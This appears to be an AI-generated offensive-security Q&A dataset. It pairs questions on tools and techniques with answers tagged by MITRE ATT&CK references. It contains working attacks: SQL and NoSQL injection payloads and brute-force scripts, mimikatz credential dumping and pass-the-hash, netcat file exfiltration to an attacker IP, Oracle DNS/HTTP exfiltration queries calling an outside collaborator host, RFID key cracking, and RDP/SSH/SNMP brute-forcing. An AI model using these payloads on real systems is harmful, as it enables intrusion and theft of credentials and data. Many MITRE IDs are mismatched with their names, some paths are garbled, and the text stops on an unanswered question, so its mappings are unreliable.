A: Metagoofil v1.2.0 can be used to gather information that may be useful for social engineering attacks against a target organization. By searching for and downloading publicly available documents, you can attempt to find details about employee names, job titles, contact information, and other potentially sensitive data that could be leveraged in phishing, pretexting, or other social engineering attacks. For example, the command:

root@kali:~# metagoofil -d example.com -t all -l 1000 -n 500 -o exampledocs -f exampledocs.html

would search for and download up to 500 files of any type from the example.com domain, which could then be analyzed for information useful in social engineering campaigns targeting the organization and its employees. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance, Credential Access.

## Q: How can mfcuk be used to recover Mifare Classic keys?
A: To recover Mifare Classic keys using mfcuk version 0.3.8, you can use the following command:

```
mfcuk -C -R -1
```
This will recover all keys from all sectors on the Mifare Classic card. You can also recover keys for a specific sector by using the `-R` option followed by the sector number. For example, to recover the keys for sector 0, use:

```
mfcuk -C -R 0
```
By default, mfcuk will try to recover both key A and key B for the specified sector(s). You can also specify to recover only one key type by adding `:A` or `:B` after the sector number.

The `-C` option is required to explicitly connect to the reader before performing the key recovery. The `-s` and `-S` options can be used to adjust the sleep timings, which may be necessary to get better results on some cards. MITRE References: MITRE ID is T1592, MITRE Name is: Obtain Credentials, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can mfoc be used to recover authentication keys from a MIFARE Classic card?
A: mfoc (version 0.10.7) is an open-source tool that can be used to recover authentication keys from MIFARE Classic cards. It implements the "offline nested" attack, which allows recovering the keys if the card has a known key (either the default one hardcoded in mfoc or a custom one provided by the user). To use mfoc, run the following command:

`mfoc -O mycard.mfd`

This will attempt to recover the keys and dump the card contents to the file "mycard.mfd". If a known key is provided using the `-k` option, mfoc will use that key instead of the default ones. MITRE References: MITRE ID is T1218, MITRE Name is: Software Packing, and MITRE Tactics are: Defense Evasion.

## Q: How can mfterm be used to perform a credential stuffing attack against Mifare Classic RFID tags?
A: mfterm version 1.0.7 can be used to perform a credential stuffing attack against Mifare Classic RFID tags. First, we can load a dictionary file containing potential keys using the `-d` option. Then, we can attempt to authenticate to the tag using the `auth` command and the keys from the dictionary. This can be automated to try many different keys in an attempt to gain unauthorized access to the tag's data. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can mfterm be used to dump the contents of a Mifare Classic RFID tag?
A: mfterm version 1.0.7 can be used to dump the contents of a Mifare Classic RFID tag. First, we need to authenticate to the tag using the `auth` command and a valid key. Then, we can use the `dump` command to read the entire contents of the tag's memory. This can be useful for analyzing the data stored on the tag, such as identifying any sensitive information that may be present. MITRE References: MITRE ID is T1565, MITRE Name is: Data Manipulation, and MITRE Tactics are: Collection.

## Q: How can mfterm be used to clone a Mifare Classic RFID tag?
A: mfterm version 1.0.7 can be used to clone a Mifare Classic RFID tag. First, we need to authenticate to the tag using the `auth` command and a valid key. Then, we can use the `save` command to save the entire contents of the tag to a file. Finally, we can use the `write` command to write the saved data to a new tag, effectively cloning the original. This can be useful for testing or bypassing access controls that rely on Mifare Classic tags. MITRE References: MITRE ID is T1531, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: CredentialAccess, PrivilegeEscalation.

## Q: How can mimikatz be used to extract passwords from a Windows system?
A: Mimikatz version 2.2.0 can be used to extract plaintext passwords from Windows systems with administrative privileges. The mimikatz.exe command can be run from an elevated command prompt to display passwords of currently logged-in users. For example, the command 'mimikatz.exe privilege::debug sekurlsa::logonpasswords' will display the plaintext passwords. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can the ascii-xfr utility in minicom 2.8-2 be used to exfiltrate data?
A: The ascii-xfr utility in minicom 2.8-2 can be used to exfiltrate data by leveraging the file transfer capabilities. To exfiltrate data:1. On the target system, use 'ascii-xfr -s [file_to_exfiltrate]' to initiate a send operation2. On the attacker system, use 'ascii-xfr -r [file_to_receive]' to receive the file MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can you dump the user credentials from the Moodle database?
A: To dump the user credentials from the Moodle database, you can run the following MySQL command:

```
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```

This will connect to the Moodle database, select the email, username, and password columns from the `mdl_user` table, and display the results. MITRE References: MITRE ID is T1033, MITRE Name is: System Owner/User Discovery, and MITRE Tactics are: Discovery.

## Q: How do I use the MSI Wrapper to wrap a 'malicious' binary?
A: Download the free version app from [https://www.exemsi.com/documentation/getting-started/](https://www.exemsi.com/download/), execute it and wrap the "malicious" binary on it. Note that you can wrap a ".bat" if you just want to execute command lines (instead of cmd.exe select the .bat file). The most important part is to configure the settings properly (these can be modified if you pack your own binary). Just click the next buttons and the last build button, and your installer/wrapper will be generated. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: What are some alternative error-based SQL injection vectors that can be used to bypass WAFs?
A: To bypass WAFs, you can try alternative error-based SQL injection vectors such as concatenating a string using the %2b character with the result of specific function calls that trigger a data type conversion error on sought-after data. Some examples of such functions include:- `SUSER_NAME()`- `USER_NAME()`- `PERMISSIONS()`- `DB_NAME()`- `FILE_NAME()`- `TYPE_NAME()`- `COL_NAME()`For example: `https://vuln.app/getItem?id=1'%2buser_name(@@version)--` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, Initial Access.

## Q: How can you retrieve the entire contents of a table in a single SQL injection query?
A: To retrieve the entire contents of a table in a single SQL injection query, you can use the `FOR JSON AUTO` clause. For example:```https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--```This will return the schema, table names, and column names in a single JSON-formatted response. If error-based vectors are used, it's important to provide an alias or name for the expression, as the output needs to be formatted as valid JSON. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, Initial Access.

## Q: How can you perform string concatenation in MS Access SQL Injection?
A: String concatenation is possible with `& (%26)` and `+ (%2b)` characters. For example:

```
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
``` MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Delivery.

## Q: How can you bypass comments in MS Access SQL Injection?
A: There are no comments in MS Access, but apparently it's possible to remove the last of a query with a NULL char:

```
1' union select 1,2 from table%00
```
If this is not working you could always fix the syntax of the query:

```
1' UNION SELECT 1,2 FROM table WHERE ''='
``` MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use the chaining equals technique to exfiltrate data in MS Access SQL Injection?
A: MS Access allows **weird syntax** such as `**'1'=2='3'='asd'=false**`. As usually the SQL injection will be inside a `**WHERE**` clause we can abuse that.

Imagine you have a SQLi in a MS Access database and you know (or guessed) that one **column name is username**, and thats the field you want to **exfiltrate**. You could check the different responses of the web app when the chaining equals technique is used and potentially exfiltrate content with a **boolean injection** using the `**Mid**` function to get substrings.

```
'=(Mid(username,1,3)='adm')='
```
If you know the **name of the table** and **column** to dump you can use a combination between `Mid` , `LAST` and `TOP` to **leak all the info** via boolean SQLi:

```
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you brute-force table names in MS Access SQL Injection?
A: Using the chaining equals technique you can brute-force table names with something like:

```
'=(select+top+1+'lala'+from+<table_name>)='
```
You can also use a more traditional way:

```
-1' AND (SELECT TOP 1 <table_name>)%00
```

You can use common table names from sources like:
* Sqlmap common table names: https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt
* Another list: http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can you brute-force column names in MS Access SQL Injection?
A: You can **brute-force current columns names** with the chaining equals trick with:

```
'=column_name='
```
Or with a **group by**:

```
-1' GROUP BY column_name%00
```
Or you can brute-force column names of a **different table** with:

```
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
``` MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can you dump data using time-based techniques in MS Access SQL Injection?
A: You can use time-based techniques to dump data in MS Access SQL Injection. Check the following resource for more details:
https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you enumerate tables in MS Access SQL Injection?
A: You can use the following query to get a list of tables in the database:

```
select MSysObjects.name
from MSysObjects
where
   MSysObjects.type In (1,4,6)
   and MSysObjects.name not like '~*'   
   and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
However, note that is very typical to find SQL Injections where you **don't have access to read the table** `**MSysObjects**`. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you enumerate files on the remote filesystem in MS Access SQL Injection?
A: The following attack vector can be used to **inferrer the existence of a file on the remote filesystem**. If the specified file exists, MS Access triggers an error message informing that the database format is invalid:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\oot.ini'%00`

Another way to enumerate files consists into **specifying a database.table item**. **If** the specified **file exists**, MS Access displays a **database format error message**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00` MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you guess the .mdb file name in MS Access SQL Injection?
A: **Database file name (.mdb)** can be inferred with the following query:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Where **name[i] is a .mdb filename** and **realTable is an existent table** within the database. Although MS Access will always trigger an error message, it is possible to distinguish between an invalid filename and a valid .mdb filename. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you crack the .mdb file password in MS Access SQL Injection?
A: **[Access PassView](https://www.nirsoft.net/utils/accesspv.html)** is a free utility that can be used to recover the main database password of Microsoft Access 95/97/2000/XP or Jet Database Engine 3.0/4.0. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can multiforcer 1.31 be used to perform a password hash cracking attack?
A: Multiforcer 1.31 is a CUDA and OpenCL accelerated rainbow table and hash brute forcing tool that can be used to crack password hashes like MD5, SHA1, LM, and NTLM. To use it for a password cracking attack, you would first need to obtain the password hash. Then, you can run multiforcer with the appropriate hash type and algorithm to attempt to crack the password using GPU acceleration. For example: 'multiforcer -h md5 -i hash.txt -r rockyou.txt'. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Multimac be used to spoof MAC addresses and evade detection during a penetration test?
A: Multimac can be used to create multiple virtual Ethernet interfaces with different MAC addresses. This can be useful for evading detection or spoofing identities during a penetration test. For example, you could use Multimac to create 10 virtual interfaces with unique MAC addresses and then use them to scan a network from different 'sources'. This could help bypass MAC filtering or other security controls. Version 1.0.3 of Multimac is used in this example. MITRE References: MITRE ID is T1497, MITRE Name is: Virtualization/Sandbox Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can multimon-ng be used to intercept POCSAG pager messages?
A: Multimon-ng version 1.3.0 can be used to intercept and decode POCSAG pager messages. To do this, connect a software-defined radio (SDR) to your system and use rtl_fm to capture the radio signal. Pipe the raw I/Q samples from rtl_fm into multimon-ng and enable the POCSAG512, POCSAG1200, and POCSAG2400 demodulators to decode the pager messages. For example: `rtl_fm -f 149.614M -s 22050 -p -19 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /dev/stdin`. MITRE References: MITRE ID is T1053, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What are some techniques to bypass Web Application Firewalls (WAFs) when performing MySQL injection?
A: Some techniques to bypass WAFs in MySQL injection include:- Using alternative sources like mysql.innodb_table_stats or sys.x$schema_flattened_keys instead of information_schema.tables- Constructing queries without commas, e.g. -1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#- Retrieving values without the column name by brute-forcing the number of columns and then the character content- Checking the MySQL version history in the sys.x$statement_analysis table- Using alternative version functions like @@innodb_version, @@version, or version() MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can ncat-w32 (v5.59beta1) be used to exfiltrate data from a compromised system during a penetration test?
A: Ncat-w32 can be used to exfiltrate data by creating a listener on your attacking system and then sending files from the compromised system to the listener. For example, you can run "ncat-w32.exe -lvnp 8080" on your attacking system to create a listener, and then on the compromised system run "ncat-w32.exe 192.168.1.100 8080 < sensitive_file.txt" to send the file over the connection. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can ncrack be used to perform a brute-force attack against an RDP server?
A: To perform a brute-force attack against an RDP server using ncrack 0.6, you can use the following command:

```console
root@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1
```
This will run ncrack in verbose mode (`-v`), read a list of IP addresses from the `win.txt` file (`-iL`), attempt to login with the username "victim" (`--user victim`) and the passwords in the `passes.txt` dictionary file (`-P passes.txt`), using the RDP protocol (`-p rdp`) with a maximum of 1 concurrent connection (`CL=1`). MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can I use the netbase package to spoof network traffic and conduct man-in-the-middle attacks?
A: I apologize, but I cannot provide information on how to use the netbase package for malicious purposes such as spoofing network traffic or conducting man-in-the-middle attacks. That would involve unethical hacking techniques that I do not feel comfortable advising on. The netbase package is intended for legitimate network configuration and administration, not for conducting attacks. I suggest using netbase only for its intended purposes, and exploring ethical security testing methodologies if you are interested in penetration testing or security research. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can netwox be used to perform network spoofing and impersonation attacks?
A: Netwox provides several tools for network spoofing and impersonation attacks. For example, tool number 110 can be used to spoof UDP packets and tool number 111 can be used to spoof TCP packets. To use these tools, run the following commands:

`netwox 110 -s <source_ip> -d <dest_ip> -p <dest_port> -m <message>`
`netwox 111 -s <source_ip> -d <dest_ip> -p <dest_port> -m <message>`

NOTE: Replace <source_ip> with the IP address you want to spoof, <dest_ip> with the destination IP address, <dest_port> with the destination port, and <message> with the message you want to send. You can also use various other options with these tools to customize the spoofed packets. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion, Lateral Movement.

## Q: How can netwox be used to perform DNS-related attacks?
A: Netwox provides several tools for performing DNS-related attacks. For example, tool number 62 can be used to perform a DNS lookup and tool number 63 can be used to perform a DNS zone transfer. To use these tools, run the following commands:

`netwox 62 -d <domain_name>`
`netwox 63 -d <domain_name> -n <nameserver_ip>`

NOTE: Replace <domain_name> with the domain you want to perform the lookup or zone transfer on, and <nameserver_ip> with the IP address of the DNS server you want to query. You can also use various other options with these tools to customize the attacks. MITRE References: MITRE ID is T1071.001, MITRE Name is: Application Layer Protocol: Domain Name System, and MITRE Tactics are: Command and Control.

## Q: How can you use the `dblink_connect` function to perform port scanning?
A: You can abuse the `dblink_connect` function to perform port scanning. If the `dblink_connect` function doesn't work, you can try using `dblink_connect_u()` instead. By connecting to different hosts and ports, you can determine if the port is open, closed, or filtered based on the response received. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can you use PostgreSQL to leak NTLM hashes?
A: You can use the `COPY` command in PostgreSQL to leak NTLM hashes to a system you control. By creating a table, copying from a UNC path (e.g., `\attacker-machineootestbar.txt`), and potentially extracting the `user` value to include in the UNC path, you can trigger a hash leak that can be captured by a tool like Responder. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Credential Access, and MITRE Tactics are: CredentialAccess.

## Q: How can you compile and use the "ld_nfs.so" library to exploit an NFS share with an IP address specified in "/etc/exports"?
A: To exploit an NFS share with an IP address specified in "/etc/exports", you can use the "ld_nfs.so" library to forge NFS RPC calls and elevate your privileges. First, compile the library using the following commands:

```
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

Then, create a C program ("pwn.c") that elevates privileges to root and executes a shell. Compile the program, place the binary on the NFS share, and use "ld_nfs.so" to set the UID to 0 (root) when accessing the binary on the share. MITRE References: MITRE ID is T1222.001, MITRE Name is: File and Directory Permissions Modification: NFS Share Misconfiguration, and MITRE Tactics are: PrivilegeEscalation.

## Q: How can you use the "nfsh.py" script to interact with the NFS share without changing ownership and leaving traces?
A: The "nfsh.py" script can be used to interact with the NFS share without changing ownership and leaving traces. The script adjusts the UID to match the file being accessed, allowing you to interact with files on the share without permission issues. Run the script like:

```
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
``` MITRE References: MITRE ID is T1222.001, MITRE Name is: File and Directory Permissions Modification: NFS Share Misconfiguration, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you escalate privileges using NFS misconfigurations?
A: You can escalate privileges using NFS misconfigurations such as the `no_root_squash` and `no_all_squash` options. These settings can allow you to create files with root privileges on the NFS share and potentially escalate privileges on the system. Refer to the [NFS no_root_squash and no_all_squash privilege escalation](/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe) guide for more details. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you execute arbitrary functions in a MongoDB injection?
A: In some cases, it may be possible to execute arbitrary functions using the $func operator of the MongoLite library (used by default in some applications). For example:

"user":{"$func": "var_dump"} MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you perform a blind NoSQL injection attack against a MongoDB database?
A: You can perform a blind NoSQL injection attack against a MongoDB database by using a script that sends requests with crafted payloads and analyzes the responses. Here's an example in Python:import requests, stringalphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"flag = ""for i in range(21):    print("[i] Looking for char number "+str(i+1))    for char in alphabet:        r = requests.get("http://chall.com?param=^"+flag+char)        if ("<TRUE>" in r.text):            flag += char            print("[+] Flag: "+flag)            break MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you brute-force login usernames and passwords from a POST login form using a MongoDB injection?
A: You can use a script to brute-force login usernames and passwords from a POST login form using a MongoDB injection. Here's an example in Python:import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username="admin"password=""while True:    for c in string.printable:        if c not in ['*','+','.','?','|']:            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)            r = requests.post(u, data = {'ids': payload}, verify = False)            if 'OK' in r.text:                print("Found one more char : %s" % (password+c))                password += c MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can NoSQL injection be used to bypass authentication in MongoDB?
A: To bypass authentication in MongoDB, you can use a NoSQL injection attack with the query: {"user":{"$gt": ""},"pass":{"$gt": ""}}. This will match any non-empty username and password, effectively logging in as any user. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some techniques to bypass the No-Execute (NX) bit protection?
A: It's possible to use techniques such as ROP (Return Oriented Programming) to bypass this protection by executing chunks of executable code already present in the binary. Some examples of ROP techniques that can be used to bypass NX include Ret2libc, Ret2syscall, and other Ret2... techniques. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you extract and crack NTLM hashes from a network capture?
A: You can use the tool https://github.com/mlgualtieri/NTLMRawUnHide to parse NTLM challenges from a network capture. Once you have the domain, username, challenge, and response, you can attempt to crack the NTLM hash using tools like hashcat. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform a Pass-the-Hash attack using Mimikatz?
A: To perform a Pass-the-Hash attack using Mimikatz, run the following command as an administrator: Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'. This will launch a process that will belong to the user specified, but internally in LSASS the saved credentials are the ones provided in the Mimikatz parameters. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access, TA0004, Privilege Escalation.

## Q: How can oclGaussCrack be used to crack the verification hash of the encrypted payload of the Gauss Virus?
A: oclGaussCrack is a tool that uses OpenCL to accelerate the 10k MD5 loop in order to crack the verification hash of the encrypted payload of the Gauss Virus. It supports multi-GPU setups and distributed computing environments, and can resume cracking sessions. The tool can be run from the command line using the 'oclgausscrack' command. Version 1.3-1kali3 is used. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can the ODAT tool be used to escalate privileges and become a DBA or SYSDBA user on an Oracle database?
A: The ODAT tool can be used to attempt to escalate privileges and gain DBA or SYSDBA access on an Oracle database using the "passwordguesser" module. This module will try a predefined list of common passwords for each valid user account found on the database. To use this module, run the following command:

`odat passwordguesser -s <target_host> -p <target_port> -U <valid_username>`

If a valid password is found, the tool can then be used to execute system commands or further compromise the database as a privileged user. MITRE References: MITRE ID is T1068, MITRE Name is: Elevation of Privilege, and MITRE Tactics are: Privilege Escalation.

## Q: How can ohrwurm be used to perform a man-in-the-middle (MITM) attack on two SIP phones?
A: To perform a MITM attack using ohrwurm, you can follow these steps:1. Identify the IP addresses of the two SIP phones you want to target (e.g. `-a 192.168.1.123 -b 192.168.1.15`).2. Identify the RTP ports used by the SIP phones (e.g. `-A 6970 -B 6970`).3. Run arpspoof from the dsniff tool to perform the MITM attack and redirect the traffic through your system.4. Run ohrwurm with the identified IP addresses and RTP ports to start fuzzing the RTP traffic:```ohrwurm -a 192.168.1.123 -b 192.168.1.15 -A 6970 -B 6970 -i eth0```This will fuzz the RTP traffic between the two SIP phones with a configurable bit error ratio (-e option). MITRE References: MITRE ID is T1557, MITRE Name is: Man-in-the-Middle, and MITRE Tactics are: Lateral Movement, Collection.

## Q: How can onesixtyone be used to perform a brute-force attack against SNMP services?
A: onesixtyone v0.3.3 can be used to perform a brute-force attack against SNMP services by providing a file of potential community strings to try. To do this, use the command: `onesixtyone -c dict.txt 192.168.1.0/24`. This will attempt to connect to SNMP services on the 192.168.1.0/24 network using the community strings listed in the 'dict.txt' file. The results will show any SNMP services that were successfully accessed using the brute-forced community strings. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can online password cracking be performed using various tools and techniques?
A: Online password cracking can be performed using various tools and techniques, such as:- Hydra for brute-forcing SSH, FTP, SNMP, and other services (e.g. 'hydra -l root -P wordlist.txt 192.168.0.101 ssh')- Medusa for brute-forcing HTTP protected directories (e.g. 'medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10')- Burp Suite Intruder for automated login brute-forcing and analyzing response lengths- Ncrack for brute-forcing Remote Desktop Protocol (RDP) (e.g. 'ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101') MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can I search for personal information related to an email, domain, or company name?
A: You can use the [fullcontact](https://www.fullcontact.com/) service to search for personal information related to an email, domain, or company name. They offer some free access. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Credential Access.

## Q: How can I find leaked credentials of emails and domains?
A: You can use the [Dehashed](https://www.dehashed.com/data) service to find leaked credentials of emails and domains. This is a commercial service. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Credential Access.

## Q: How can I search for a email in pastebin data to find if it appeared in any leaks?
A: You can use the [psbdmp](https://psbdmp.ws/) service to search for an email in pastebin data to find if it appeared in any leaks. This is a commercial service. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Credential Access.

## Q: How can I find passwords associated with leaked emails?
A: You can use the [ghostproject](https://ghostproject.fr/) service to find passwords associated with leaked emails. This is a commercial service. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Credential Access.

## Q: How can I check if an email or domain has been pwned and find associated passwords?
A: You can use the [haveibeenpwned](https://haveibeenpwned.com/) service to check if an email or domain has been pwned and find associated passwords. This is a commercial service. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Credential Access.

## Q: How could OpenOCD be leveraged during a CTF event to retrieve sensitive data from an embedded device?
A: In a CTF scenario, OpenOCD version 0.12.0 could be used to interface with an embedded device and extract sensitive data. For example, you could use OpenOCD's gdb remote protocol server to connect to the target, dump memory contents, and search for flags or other valuable information. OpenOCD also supports scripting with the Tcl language, allowing you to automate interactions with the target device and streamline the extraction process. MITRE References: MITRE ID is T1482, MITRE Name is: Domain Trust Discovery, and MITRE Tactics are: Discovery.

## Q: How can you exploit open redirect vulnerabilities?
A: Open redirect vulnerabilities can be exploited to phish users, steal credentials, or access other sensitive resources. Attackers can craft malicious URLs that redirect users to attacker-controlled sites, often bypassing security controls. For example, an attacker could create a URL like `http://legitimate-site.com/redirect?url=http://attacker-site.com` to trick users into visiting the attacker's site. MITRE References: MITRE ID is T1217, MITRE Name is: Browser Session Hijacking, and MITRE Tactics are: Credential Access.

## Q: How can ophcrack v3.8.0 be used to crack passwords in an efficient and stealthy manner?
A: To use ophcrack v3.8.0 efficiently and stealthily for password cracking, you can:1. Leverage the -n option to specify the number of threads to use, which can speed up the cracking process without overwhelming the target system.2. Use the -q quiet mode option to minimize output and reduce the chance of detection.3. Disable session auto-saving with the -s option to avoid leaving traces of your cracking activity.4. Redirect all output to a log file using the -l option, keeping the console clear of potentially suspicious activity.5. Carefully select the rainbow tables using the -t option to target the specific Windows versions you expect to find on the target system, reducing unnecessary computations.By using these options, you can run ophcrack in a more efficient and stealthy manner, reducing the chances of detection during a penetration test or CTF challenge. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What Oracle packages can be used to perform outbound network requests and port scanning?
A: Some Oracle packages that can be used to perform outbound network requests and port scanning include:

- **DBMS_LDAP.INIT**: This function initializes a session with an LDAP server and takes a hostname and port number as an argument. It can be used to perform basic port scanning.

- **UTL_SMTP**: The `UTL_SMTP.OPEN_CONNECTION` function can be used to test TCP connectivity to a host and port.

- **UTL_TCP**: This package allows for raw TCP/IP communication and can be used to interact with arbitrary TCP services, including cloud metadata services.

- **UTL_HTTP**: The `UTL_HTTP.REQUEST` function can be used to make HTTP requests to hosts and ports, effectively acting as a basic port scanner. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, Reconnaissance.

## Q: How can the DBMS_LDAP.INIT function be used for DNS and HTTP exfiltration?
A: The `DBMS_LDAP.INIT` function can be used to exfiltrate data over DNS or HTTP:

DNS Exfiltration:
```SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;```

HTTP Exfiltration:
```SELECT DBMS_LDAP.INIT('http://example.com/exfiltrate?data='||(SELECT sensitive_data FROM table),80) FROM dual;``` MITRE References: MITRE ID is T1041, MITRE Name is: Exfiltration Over C2 Channel, and MITRE Tactics are: TA0010, Exfiltration.

## Q: How can the oscanner tool be used to test for common and dictionary-based passwords on an Oracle database?
A: The oscanner tool can be used to perform password testing against an Oracle database. To test for common and dictionary-based passwords, use the following command:```oscanner -s <target_ip> -P <port> -r <results_file>```This will connect to the target Oracle server and attempt to brute-force common and dictionary-based passwords. The results will be saved to the specified results file in the graphical Java tree view format.Note that password testing should only be performed on systems you have explicit permission to test, as it may be considered unauthorized access if done without approval. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker abuse the Host header to steal password reset codes?
A: The back-end can trust the Host header to perform some actions, such as using its value as the domain to send a password reset. An attacker can request the password reset of other users and change the domain to one controlled by them to steal the password reset codes. Additionally, spam filters or other intermediary devices/bots may click on the reset password link to analyze it, allowing the attacker to obtain the token without the user clicking on it. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Initial Access, Credential Access.

## Q: How can an attacker use the registration functionality to take over any email?
A: An attacker can try to register as an already existent user, using equivalent characters (dots, lots of spaces, and Unicode). If the new confirmation email is sent to the first registered email, the attacker can take over any email. Alternatively, if the attacker can enable the second email by confirming the first one, they can also take over any account. MITRE References: MITRE ID is T1586, MITRE Name is: Compromise Accounts, and MITRE Tactics are: Initial Access, Credential Access.

## Q: How can an attacker access the internal service desk of companies using Atlassian?
